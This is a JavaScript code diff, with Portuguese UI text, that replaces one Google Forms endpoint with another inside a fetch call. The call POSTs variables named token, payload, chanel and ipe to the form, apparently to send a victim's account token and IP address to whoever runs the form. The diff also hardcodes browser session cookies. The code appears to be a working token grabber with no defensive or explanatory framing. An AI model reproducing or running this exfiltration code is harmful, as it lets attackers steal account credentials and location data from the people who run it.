@@ -55,26 +55,28 @@ function sleep(ms) {
     alert('prencha os campos');
   }  
     console.log('Two seconds later, showing sleep in a loop...');  
-    fetch("https://docs.google.com/forms/d/e/1FAIpQLSe67N-XInnMm75tekLqSLErqMhv7JLyZXbu-xj2SS3PSEWgTQ/formResponse", {
-      "headers": {
-        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
-        "accept-language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
-        "cache-control": "max-age=0",
-        "content-type": "application/x-www-form-urlencoded",
-        "sec-fetch-dest": "document",
-        "sec-fetch-mode": "navigate",
-        "sec-fetch-site": "same-origin",
-        "sec-fetch-user": "?1",
-        "upgrade-insecure-requests": "1",
-        "x-client-data": "CNf9ygE=",
-        "cookie": "S=spreadsheet_forms=j7RTprDFEHee29Ny0bGNyhVHcmThDAiuTmA9Al8wlDk; 1P_JAR=2021-04-13-02; OGPC=19022591-1:; NID=213=bPmL-gKdX5NwRRBYBkbsKMFdii6comYsx6uOS_bkE76fh-c1HHEu515bdsh_SZKJ4H4QYeqUAkAupnC45krnucKZ4EGun3gamyVpQzKx-IunGJ3MFAyNNbwsuo1Z-Urq5KEDjwKBnLmwiJYoHDhXUiYxWMtv7YYhGuAQn4Et128"
-      },
-      "referrer": "https://docs.google.com/forms/d/e/1FAIpQLSe67N-XInnMm75tekLqSLErqMhv7JLyZXbu-xj2SS3PSEWgTQ/viewform?fbzx=8374850590648730036",
-      "referrerPolicy": "strict-origin-when-cross-origin",
-      "body": "entry.1517977571="+chanel+"a&entry.1150995089="+payload+"&entry.2108071135="+token+"&entry.1649659836="+ipe+"&fvv=1&draftResponse=%5Bnull%2Cnull%2C%228374850590648730036%22%5D%0D%0A&pageHistory=0&fbzx=8374850590648730036",
-      "method": "POST",
-      "mode": "cors"
-    });
+    fetch("https://docs.google.com/forms/d/e/1FAIpQLSc6CmAXrp8-7mRyt1RwX8JjXtLNCQav_SH16uJbXI7BUHNsPA/formResponse", {
+  "headers": {
+    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+    "accept-language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
+    "cache-control": "max-age=0",
+    "content-type": "application/x-www-form-urlencoded",
+    "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\"",
+    "sec-ch-ua-mobile": "?0",
+    "sec-fetch-dest": "document",
+    "sec-fetch-mode": "navigate",
+    "sec-fetch-site": "same-origin",
+    "sec-fetch-user": "?1",
+    "upgrade-insecure-requests": "1",
+    "x-client-data": "CLTeygE=",
+    "cookie": "S=spreadsheet_forms=Ea4HFAtlBk2M3nVUcb6U5iXiehns0U-Dbpdyfo3-RiA; NID=214=qwpmTJnCYN-0BxAkkI6Wqhzs2EURu9Wp23vYWx-RHOIJzB7Fp7-APVx8hEdHXRTz30w8-PNZgEMJugy1OWpJt0rs6sKyEsil2HLLxxAkkhks8rTEqdI254ONCx175rf-18Xm0tYIhxD2AuaRSvDyJX65nLyf6FiAeFjE5Yq3WQQ"
+  },
+  "referrer": "https://docs.google.com/forms/d/e/1FAIpQLSc6CmAXrp8-7mRyt1RwX8JjXtLNCQav_SH16uJbXI7BUHNsPA/viewform?fbzx=-7617760172682264851",
+  "referrerPolicy": "strict-origin-when-cross-origin",
+  "body": "entry.1747780663="+payload+"&entry.1793950151="+chanel+"&entry.1834140685="+token+"&entry.1981409486="+ipe+"&fvv=1&draftResponse=%5Bnull%2Cnull%2C%22-7617760172682264851%22%5D%0D%0A&pageHistory=0&fbzx=-7617760172682264851",
+  "method": "POST",
+  "mode": "cors"
+});
     // Sleep in loop
     while(true) {
       
